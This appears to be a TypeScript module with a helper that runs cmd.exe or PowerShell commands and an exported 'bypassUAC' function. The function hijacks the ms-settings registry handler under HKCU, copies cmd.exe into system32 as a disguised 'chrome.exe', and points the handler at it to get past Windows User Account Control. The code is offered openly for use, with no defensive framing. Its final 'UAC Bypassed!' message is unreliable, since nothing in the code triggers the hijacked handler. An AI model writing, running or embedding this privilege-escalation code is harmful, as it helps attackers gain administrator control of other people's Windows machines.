import { exec } from 'child_process';

const executeCommand = (
  command: string,
  usePowerShell: boolean = false,
): Promise<string> => {
  return new Promise((resolve, reject) => {
    const shell = usePowerShell ? 'powershell.exe' : 'cmd.exe';
    const commandToRun = usePowerShell
      ? `-Command ${command}`
      : `/c ${command}`;

    exec(`${shell} ${commandToRun}`, (error, stdout, stderr) => {
      if (error) {
        reject(`Erro ao executar "${command}": ${error.message}`);
        return;
      }
      if (stderr) {
        reject(`Erro (stderr) ao executar "${command}": ${stderr}`);
        return;
      }
      resolve(stdout.trim());
    });
  });
};

const bypassUAC = async () => {
  await executeCommand(
    'New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force',
    true,
  );
  await executeCommand(
    'New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -name "DelegateExecute" -Value "" -Force',
    true,
  );
  await executeCommand(
    'copy c:\\Windows\\system32\\cmd.exe c:\\Windows\\system32\\chrome.exe',
    false,
  );

  await executeCommand(
    'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "c:\\Windows\\system32\\chrome.exe" -Force',
    true,
  );
  console.log('UAC Bypassed!');
};

export default bypassUAC;
